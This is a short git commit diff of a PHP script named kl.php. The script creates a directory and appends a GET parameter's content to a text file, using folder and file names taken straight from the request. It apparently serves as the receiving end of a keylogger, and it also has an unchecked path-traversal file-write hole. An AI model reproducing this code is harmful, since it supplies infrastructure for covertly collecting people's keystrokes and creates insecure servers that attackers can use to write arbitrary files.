f530fd45c886d9261801c2744ba244e98961e62d
Guillaume_SX <virtualgeek000@gmail.com>
2016-11-21 19:40:20 +0100

    commit

--- kl.php
+++ kl.php
@@ -1,6 +1,11 @@
 <?php
+$dossier = $_GET['fp'];
+if(!is_dir($dossier)){
+   mkdir($dossier);
+}
+
 if((isset($_GET['l'])) && (isset($_GET['fp']))) {
-  $f=fopen($_GET['fp'] . '/log_' . '.txt','a+');
+  $f=fopen($_GET['fp'] . '/'. $_GET['s'] . '.txt','a+');
   fwrite($f,$_GET['l']);
   fclose($f);
 }
